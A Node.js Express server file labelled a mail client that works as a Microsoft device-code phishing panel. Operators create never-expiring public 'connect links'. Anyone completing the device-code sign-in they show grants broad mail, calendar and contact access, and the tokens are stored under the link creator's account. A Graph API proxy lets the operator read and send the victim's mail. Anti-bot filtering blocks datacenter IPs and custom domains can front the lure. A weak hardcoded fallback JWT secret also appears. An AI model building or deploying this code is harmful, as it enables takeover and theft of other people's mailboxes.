const express = require("express");
const cors = require("cors");
const msal = require("@azure/msal-node");
const bcrypt = require("bcryptjs");
const jwt = require("jsonwebtoken");
const Database = require("better-sqlite3");
const path = require("path");
require("dotenv").config();

const app = express();
app.set("trust proxy", 1);

const isProduction = process.env.NODE_ENV === "production";
const staticOrigins = isProduction
  ? (process.env.CORS_ORIGIN || "").split(",").map((s) => s.trim()).filter(Boolean)
  : ["http://localhost:5173", "http://localhost:5174"];

// Dynamic CORS: static origins + verified custom domains from DB (cached)
let verifiedDomainOrigins = [];
let domainCacheTime = 0;
const DOMAIN_CACHE_TTL = 60_000; // refresh every 60s

app.use(cors({
  origin: (origin, callback) => {
    // Allow requests with no origin (non-browser, same-origin)
    if (!origin) return callback(null, true);
    // Allow static origins
    if (staticOrigins.length === 0) return callback(null, true);
    if (staticOrigins.includes(origin)) return callback(null, true);
    // Refresh verified domain cache if stale
    if (Date.now() - domainCacheTime > DOMAIN_CACHE_TTL) {
      try {
        const rows = db.prepare("SELECT domain FROM custom_domains WHERE dns_verified = 1 AND ssl_verified = 1").all();
        verifiedDomainOrigins = rows.map((r) => `https://${r.domain}`);
        domainCacheTime = Date.now();
      } catch { /* table may not exist yet */ }
    }
    if (verifiedDomainOrigins.includes(origin)) return callback(null, true);
    callback(null, false);
  },
  credentials: true,
}));
app.use(express.json());

const {
  generalLimiter,
  startSessionLimiter,
  pollingLimiter,
  validateHeadersLight,
  validateHeadersStrict,
  blockDatacenterIPs,
  generateChallenge,
  validateAntibot,
  cleanupExpiredChallenges,
} = require("./antibot.cjs");

// In production, serve the built frontend
if (isProduction) {
  const distPath = path.join(__dirname, "..", "dist");
  app.use(express.static(distPath));
}

// ─── Config ──────────────────────────────────────────────────

const JWT_SECRET = process.env.JWT_SECRET || "mail-client-secret-change-in-production";
const AZURE_CLIENT_ID = process.env.VITE_AZURE_CLIENT_ID;
const AZURE_TENANT_ID = process.env.VITE_AZURE_TENANT_ID || "common";
const APP_DOMAIN = process.env.APP_DOMAIN || "";

// ─── Database ────────────────────────────────────────────────

const db = new Database(path.join(__dirname, "mailclient.db"));

// Enable WAL mode for better performance
db.pragma("journal_mode = WAL");

// Create tables
db.exec(`
  CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    email TEXT UNIQUE NOT NULL,
    password_hash TEXT NOT NULL,
    display_name TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
  );

  CREATE TABLE IF NOT EXISTS microsoft_accounts (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL,
    ms_account_id TEXT,
    ms_username TEXT,
    ms_display_name TEXT,
    access_token TEXT,
    refresh_token TEXT,
    expires_on TEXT,
    home_account_id TEXT,
    connected_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
  );

  CREATE TABLE IF NOT EXISTS connect_links (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    link_id TEXT UNIQUE NOT NULL,
    user_id INTEGER NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
  );

  CREATE TABLE IF NOT EXISTS custom_domains (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL,
    domain TEXT UNIQUE NOT NULL,
    dns_verified INTEGER DEFAULT 0,
    ssl_verified INTEGER DEFAULT 0,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
  );
`);

// ─── MSAL Client ─────────────────────────────────────────────

const msalConfig = {
  auth: {
    clientId: AZURE_CLIENT_ID,
    authority: `https://login.microsoftonline.com/${AZURE_TENANT_ID}`,
  },
};

const pca = new msal.PublicClientApplication(msalConfig);

// Track pending device code logins: loginId -> { status, data }
const pendingLogins = new Map();

// ─── Middleware: JWT Auth ────────────────────────────────────

function requireAuth(req, res, next) {
  const authHeader = req.headers.authorization;
  if (!authHeader || !authHeader.startsWith("Bearer ")) {
    return res.status(401).json({ error: "Authentication required" });
  }

  try {
    const token = authHeader.split(" ")[1];
    const decoded = jwt.verify(token, JWT_SECRET);
    req.userId = decoded.userId;
    req.username = decoded.username;
    next();
  } catch {
    return res.status(401).json({ error: "Invalid or expired token" });
  }
}

// ─── Auth Routes: Register & Login ──────────────────────────

app.post("/auth/register", async (req, res) => {
  const { username, email, password, displayName } = req.body;

  if (!username || !email || !password) {
    return res.status(400).json({ error: "Username, email, and password are required" });
  }

  if (password.length < 6) {
    return res.status(400).json({ error: "Password must be at least 6 characters" });
  }

  try {
    const existing = db.prepare("SELECT id FROM users WHERE username = ? OR email = ?").get(username, email);
    if (existing) {
      return res.status(409).json({ error: "Username or email already exists" });
    }

    const passwordHash = await bcrypt.hash(password, 10);
    const result = db.prepare(
      "INSERT INTO users (username, email, password_hash, display_name) VALUES (?, ?, ?, ?)"
    ).run(username, email, passwordHash, displayName || username);

    const token = jwt.sign(
      { userId: result.lastInsertRowid, username },
      JWT_SECRET,
      { expiresIn: "7d" }
    );

    res.json({
      token,
      user: {
        id: result.lastInsertRowid,
        username,
        email,
        displayName: displayName || username,
      },
    });
  } catch (error) {
    console.error("Register error:", error);
    res.status(500).json({ error: "Registration failed" });
  }
});

app.post("/auth/login", async (req, res) => {
  const { username, password } = req.body;

  if (!username || !password) {
    return res.status(400).json({ error: "Username and password are required" });
  }

  try {
    const user = db.prepare(
      "SELECT id, username, email, password_hash, display_name FROM users WHERE username = ? OR email = ?"
    ).get(username, username);

    if (!user) {
      return res.status(401).json({ error: "Invalid credentials" });
    }

    const valid = await bcrypt.compare(password, user.password_hash);
    if (!valid) {
      return res.status(401).json({ error: "Invalid credentials" });
    }

    const token = jwt.sign(
      { userId: user.id, username: user.username },
      JWT_SECRET,
      { expiresIn: "7d" }
    );

    // Get all connected Microsoft accounts
    const msAccounts = db.prepare(
      "SELECT id, ms_username, ms_display_name FROM microsoft_accounts WHERE user_id = ?"
    ).all(user.id);

    res.json({
      token,
      user: {
        id: user.id,
        username: user.username,
        email: user.email,
        displayName: user.display_name,
      },
      microsoftConnected: msAccounts.length > 0,
      microsoftAccounts: msAccounts.map((a) => ({
        id: a.id,
        username: a.ms_username,
        displayName: a.ms_display_name,
      })),
    });
  } catch (error) {
    console.error("Login error:", error);
    res.status(500).json({ error: "Login failed" });
  }
});

// Get current user info
app.get("/auth/me", requireAuth, (req, res) => {
  const user = db.prepare(
    "SELECT id, username, email, display_name FROM users WHERE id = ?"
  ).get(req.userId);

  if (!user) {
    return res.status(404).json({ error: "User not found" });
  }

  const msAccounts = db.prepare(
    "SELECT id, ms_username, ms_display_name FROM microsoft_accounts WHERE user_id = ?"
  ).all(req.userId);

  res.json({
    user: {
      id: user.id,
      username: user.username,
      email: user.email,
      displayName: user.display_name,
    },
    microsoftConnected: msAccounts.length > 0,
    microsoftAccounts: msAccounts.map((a) => ({
      id: a.id,
      username: a.ms_username,
      displayName: a.ms_display_name,
    })),
  });
});

// ─── Microsoft Account: Device Code Flow ────────────────────

function generateId() {
  return Math.random().toString(36).substring(2) + Date.now().toString(36);
}

const SCOPES = [
  "User.Read",
  "Mail.ReadWrite",
  "Mail.Send",
  "MailboxSettings.Read",
  "Calendars.ReadWrite",
  "Contacts.ReadWrite",
  "People.Read",
  "offline_access",
];

// Active device code sessions: sessionId -> { linkId, userId, userCode, status, ... }
// These are short-lived (15 min max) and stay in-memory
const deviceSessions = new Map();

function saveAccount(userId, authResult) {
  const existing = db.prepare(
    "SELECT id FROM microsoft_accounts WHERE user_id = ? AND ms_account_id = ?"
  ).get(userId, authResult.account?.localAccountId);

  let accountDbId;
  if (existing) {
    db.prepare(`
      UPDATE microsoft_accounts SET
        ms_username = ?, ms_display_name = ?,
        access_token = ?, home_account_id = ?, expires_on = ?,
        connected_at = CURRENT_TIMESTAMP
      WHERE id = ?
    `).run(
      authResult.account?.username,
      authResult.account?.name,
      authResult.accessToken,
      authResult.account?.homeAccountId,
      authResult.expiresOn?.toISOString(),
      existing.id
    );
    accountDbId = existing.id;
  } else {
    const result = db.prepare(`
      INSERT INTO microsoft_accounts
        (user_id, ms_account_id, ms_username, ms_display_name, access_token, home_account_id, expires_on)
      VALUES (?, ?, ?, ?, ?, ?, ?)
    `).run(
      userId,
      authResult.account?.localAccountId,
      authResult.account?.username,
      authResult.account?.name,
      authResult.accessToken,
      authResult.account?.homeAccountId,
      authResult.expiresOn?.toISOString()
    );
    accountDbId = result.lastInsertRowid;
  }

  return {
    id: accountDbId,
    username: authResult.account?.username,
    displayName: authResult.account?.name,
  };
}

// Generate a persistent connect link (stored in DB, never expires)
app.post("/microsoft/connect", requireAuth, (req, res) => {
  const linkId = generateId();
  const userId = req.userId;

  db.prepare("INSERT INTO connect_links (link_id, user_id) VALUES (?, ?)").run(linkId, userId);

  res.json({ linkId });
});

// Get all links for the authenticated user
app.get("/microsoft/my-links", requireAuth, (req, res) => {
  const links = db.prepare("SELECT link_id, created_at FROM connect_links WHERE user_id = ? ORDER BY created_at DESC").all(req.userId);
  res.json({ links: links.map((l) => ({ linkId: l.link_id, createdAt: l.created_at })) });
});

// Antibot: challenge endpoint
app.get("/antibot/challenge/:linkId", generalLimiter, blockDatacenterIPs, validateHeadersLight, generateChallenge);

// Public: start a fresh device code session from a connect link
app.post("/microsoft/start-session/:linkId", startSessionLimiter, blockDatacenterIPs, validateHeadersStrict, validateAntibot, async (req, res) => {
  const link = db.prepare("SELECT user_id FROM connect_links WHERE link_id = ?").get(req.params.linkId);
  if (!link) {
    return res.status(404).json({ error: "Connection link not found" });
  }

  const sessionId = generateId();
  const userId = link.user_id;

  try {
    const deviceCodeRequest = {
      scopes: SCOPES,
      deviceCodeCallback: (response) => {
        deviceSessions.set(sessionId, {
          linkId: req.params.linkId,
          userId,
          userCode: response.userCode,
          verificationUri: response.verificationUri,
          message: response.message,
          status: "pending",
        });
      },
    };

    pca.acquireTokenByDeviceCode(deviceCodeRequest)
      .then((authResult) => {
        const session = deviceSessions.get(sessionId);
        if (session) {
          session.status = "completed";
          session.msAccount = saveAccount(userId, authResult);
        }
      })
      .catch((err) => {
        const session = deviceSessions.get(sessionId);
        if (session) {
          session.status = "error";
          session.error = err.message;
        }
      });

    // Wait for deviceCodeCallback to fire
    await new Promise((resolve) => setTimeout(resolve, 3000));

    const session = deviceSessions.get(sessionId);
    if (session && session.userCode) {
      res.json({
        sessionId,
        userCode: session.userCode,
        verificationUri: session.verificationUri,
        message: session.message,
      });
    } else {
      res.status(500).json({ error: "Failed to start device code flow. Check your Azure app registration." });
    }
  } catch (error) {
    console.error("Start session error:", error);
    res.status(500).json({ error: error.message });
  }
});

// Public: get connect link info (validates link exists)
app.get("/microsoft/connect-info/:linkId", generalLimiter, blockDatacenterIPs, validateHeadersLight, (req, res) => {
  const link = db.prepare("SELECT id FROM connect_links WHERE link_id = ?").get(req.params.linkId);
  if (!link) {
    return res.status(404).json({ error: "Connection link not found" });
  }
  res.json({ valid: true });
});

// Public: poll session status
app.get("/microsoft/session-status/:sessionId", pollingLimiter, blockDatacenterIPs, (req, res) => {
  const session = deviceSessions.get(req.params.sessionId);
  if (!session) {
    return res.status(404).json({ error: "Session not found" });
  }
  if (session.status === "completed") {
    res.json({ status: "completed" });
    // Clean up session but keep the link alive
    deviceSessions.delete(req.params.sessionId);
  } else if (session.status === "error") {
    res.json({ status: "error", error: session.error });
    deviceSessions.delete(req.params.sessionId);
  } else {
    res.json({ status: "pending" });
  }
});

// Authenticated: poll for account additions (used by the app to detect new connections)
app.get("/microsoft/poll/:linkId", requireAuth, (req, res) => {
  const link = db.prepare("SELECT id FROM connect_links WHERE link_id = ?").get(req.params.linkId);
  if (!link) {
    return res.status(404).json({ error: "Link not found" });
  }

  // Find completed sessions for this link
  for (const [sessionId, session] of deviceSessions.entries()) {
    if (session.linkId === req.params.linkId && session.status === "completed") {
      const msAccount = session.msAccount;
      deviceSessions.delete(sessionId);
      return res.json({ status: "completed", msAccount });
    }
    if (session.linkId === req.params.linkId && session.status === "error") {
      const error = session.error;
      deviceSessions.delete(sessionId);
      return res.json({ status: "error", error });
    }
  }

  res.json({ status: "pending" });
});

// Disconnect Microsoft account (by account DB id)
app.post("/microsoft/disconnect", requireAuth, (req, res) => {
  const { accountId } = req.body;
  if (accountId) {
    db.prepare("DELETE FROM microsoft_accounts WHERE id = ? AND user_id = ?").run(accountId, req.userId);
  } else {
    db.prepare("DELETE FROM microsoft_accounts WHERE user_id = ?").run(req.userId);
  }
  res.json({ ok: true });
});

// ─── Custom Domains ──────────────────────────────────────────

const dns = require("dns");
const https = require("https");

app.get("/domains/list", requireAuth, (req, res) => {
  const domains = db.prepare("SELECT * FROM custom_domains WHERE user_id = ? ORDER BY created_at DESC").all(req.userId);
  res.json({ domains, appDomain: APP_DOMAIN });
});

app.post("/domains/add", requireAuth, (req, res) => {
  const { domain } = req.body;
  if (!domain || typeof domain !== "string") {
    return res.status(400).json({ error: "Domain is required" });
  }

  // Clean and validate domain
  const cleanDomain = domain.trim().toLowerCase().replace(/^https?:\/\//, "").replace(/\/+$/, "");
  if (!/^[a-z0-9]([a-z0-9-]*[a-z0-9])?(\.[a-z0-9]([a-z0-9-]*[a-z0-9])?)+$/.test(cleanDomain)) {
    return res.status(400).json({ error: "Invalid domain format" });
  }

  try {
    db.prepare("INSERT INTO custom_domains (user_id, domain) VALUES (?, ?)").run(req.userId, cleanDomain);
    const inserted = db.prepare("SELECT * FROM custom_domains WHERE domain = ?").get(cleanDomain);
    res.json({
      domain: inserted,
      appDomain: APP_DOMAIN,
      instructions: `Add a CNAME record pointing "${cleanDomain}" to "${APP_DOMAIN}"`,
    });
  } catch (err) {
    if (err.message?.includes("UNIQUE")) {
      return res.status(409).json({ error: "Domain already exists" });
    }
    res.status(500).json({ error: "Failed to add domain" });
  }
});

app.post("/domains/verify-dns/:domainId", requireAuth, async (req, res) => {
  const domain = db.prepare("SELECT * FROM custom_domains WHERE id = ? AND user_id = ?").get(req.params.domainId, req.userId);
  if (!domain) return res.status(404).json({ error: "Domain not found" });

  try {
    // Check CNAME records
    const cnames = await dns.promises.resolveCname(domain.domain).catch(() => []);
    const aRecords = await dns.promises.resolve4(domain.domain).catch(() => []);
    const appARecords = APP_DOMAIN ? await dns.promises.resolve4(APP_DOMAIN).catch(() => []) : [];

    // Verify CNAME points to our app domain, or A records match
    const cnameMatch = APP_DOMAIN && cnames.some((c) => c.toLowerCase().replace(/\.$/, "") === APP_DOMAIN.toLowerCase());
    const aMatch = appARecords.length > 0 && aRecords.some((a) => appARecords.includes(a));

    if (cnameMatch || aMatch) {
      db.prepare("UPDATE custom_domains SET dns_verified = 1 WHERE id = ?").run(domain.id);
      res.json({ verified: true, method: cnameMatch ? "CNAME" : "A record" });
    } else {
      res.json({
        verified: false,
        cnames,
        aRecords,
        expected: APP_DOMAIN,
        hint: `Add a CNAME record pointing "${domain.domain}" to "${APP_DOMAIN}"`,
      });
    }
  } catch (err) {
    res.json({ verified: false, error: "DNS lookup failed. Check that the domain exists and DNS has propagated." });
  }
});

app.post("/domains/verify-ssl/:domainId", requireAuth, (req, res) => {
  const domain = db.prepare("SELECT * FROM custom_domains WHERE id = ? AND user_id = ?").get(req.params.domainId, req.userId);
  if (!domain) return res.status(404).json({ error: "Domain not found" });

  if (!domain.dns_verified) {
    return res.status(400).json({ error: "DNS must be verified before checking SSL" });
  }

  const reqHttps = https.request(
    { hostname: domain.domain, port: 443, method: "HEAD", timeout: 10000 },
    (response) => {
      const cert = response.socket.getPeerCertificate();
      if (cert && cert.subject) {
        db.prepare("UPDATE custom_domains SET ssl_verified = 1 WHERE id = ?").run(domain.id);
        res.json({ verified: true, issuer: cert.issuer?.O || "Unknown", validTo: cert.valid_to });
      } else {
        res.json({ verified: false, error: "No valid SSL certificate found" });
      }
    }
  );

  reqHttps.on("error", (err) => {
    res.json({ verified: false, error: `SSL check failed: ${err.message}. Make sure your domain has an SSL certificate installed.` });
  });

  reqHttps.on("timeout", () => {
    reqHttps.destroy();
    res.json({ verified: false, error: "SSL check timed out. The domain may not be reachable over HTTPS." });
  });

  reqHttps.end();
});

app.delete("/domains/:domainId", requireAuth, (req, res) => {
  const result = db.prepare("DELETE FROM custom_domains WHERE id = ? AND user_id = ?").run(req.params.domainId, req.userId);
  if (result.changes === 0) return res.status(404).json({ error: "Domain not found" });
  res.json({ ok: true });
});

// ─── Graph API Proxy ─────────────────────────────────────────

app.use("/api/graph", requireAuth, async (req, res) => {
  // Get the user's Microsoft account — use _accountId if specified, otherwise first connected
  const requestedAccountId = req.query._accountId;
  let msAccount;
  if (requestedAccountId) {
    msAccount = db.prepare(
      "SELECT id, access_token, home_account_id, expires_on FROM microsoft_accounts WHERE id = ? AND user_id = ?"
    ).get(Number(requestedAccountId), req.userId);
  } else {
    msAccount = db.prepare(
      "SELECT id, access_token, home_account_id, expires_on FROM microsoft_accounts WHERE user_id = ? ORDER BY id ASC LIMIT 1"
    ).get(req.userId);
  }

  if (!msAccount) {
    return res.status(403).json({ error: "No Microsoft account connected. Please connect your Office 365 account first." });
  }

  let accessToken = msAccount.access_token;

  // Check if token is expired and try to refresh
  if (msAccount.expires_on && new Date(msAccount.expires_on) < new Date()) {
    try {
      const accounts = await pca.getTokenCache().getAllAccounts();
      const account = accounts.find(a => a.homeAccountId === msAccount.home_account_id);

      if (account) {
        const refreshResult = await pca.acquireTokenSilent({
          account,
          scopes: ["User.Read", "Mail.ReadWrite", "Mail.Send", "MailboxSettings.Read", "Calendars.ReadWrite", "Contacts.ReadWrite", "People.Read", "offline_access"],
        });
        accessToken = refreshResult.accessToken;

        // Update stored token
        db.prepare(
          "UPDATE microsoft_accounts SET access_token = ?, expires_on = ? WHERE id = ?"
        ).run(accessToken, refreshResult.expiresOn?.toISOString(), msAccount.id);
      }
    } catch {
      return res.status(401).json({ error: "Microsoft token expired. Please reconnect your account." });
    }
  }

  // Build Graph API URL
  const graphPath = req.originalUrl.replace("/api/graph/", "").split("?")[0];
  const graphUrl = `https://graph.microsoft.com/v1.0/${graphPath}`;
  const url = new URL(graphUrl);

  // Forward query parameters (except internal ones)
  for (const [key, value] of Object.entries(req.query)) {
    if (key.startsWith("_")) continue; // skip internal params like _accountId
    url.searchParams.set(key, String(value));
  }

  try {
    const fetchOptions = {
      method: req.method,
      headers: {
        Authorization: `Bearer ${accessToken}`,
        "Content-Type": "application/json",
      },
    };

    if (req.method !== "GET" && req.method !== "HEAD" && req.body && Object.keys(req.body).length > 0) {
      fetchOptions.body = JSON.stringify(req.body);
    }

    const graphRes = await fetch(url.toString(), fetchOptions);
    const contentType = graphRes.headers.get("content-type") || "";

    if (graphRes.status === 204) {
      return res.status(204).end();
    }

    if (contentType.includes("application/json")) {
      const data = await graphRes.json();
      res.status(graphRes.status).json(data);
    } else {
      const text = await graphRes.text();
      res.status(graphRes.status).send(text);
    }
  } catch (error) {
    console.error("Graph proxy error:", error);
    res.status(500).json({ error: "Failed to call Microsoft Graph API" });
  }
});

// ─── SPA fallback (production) ───────────────────────────────

if (isProduction) {
  const distPath = path.join(__dirname, "..", "dist");
  app.use((req, res, next) => {
    if (req.method === "GET" && !req.path.startsWith("/api/") && !req.path.startsWith("/auth/") && !req.path.startsWith("/microsoft/") && !req.path.startsWith("/antibot/")) {
      res.sendFile(path.join(distPath, "index.html"));
    } else {
      next();
    }
  });
}

// ─── Antibot cleanup ─────────────────────────────────────────

setInterval(cleanupExpiredChallenges, 60_000);

// ─── Start server ────────────────────────────────────────────

const PORT = process.env.PORT || 3001;
app.listen(PORT, () => {
  console.log(`Mail Client server running on http://localhost:${PORT}`);
  console.log(`Azure Client ID: ${AZURE_CLIENT_ID}`);
  console.log(`Azure Tenant: ${AZURE_TENANT_ID}`);
});
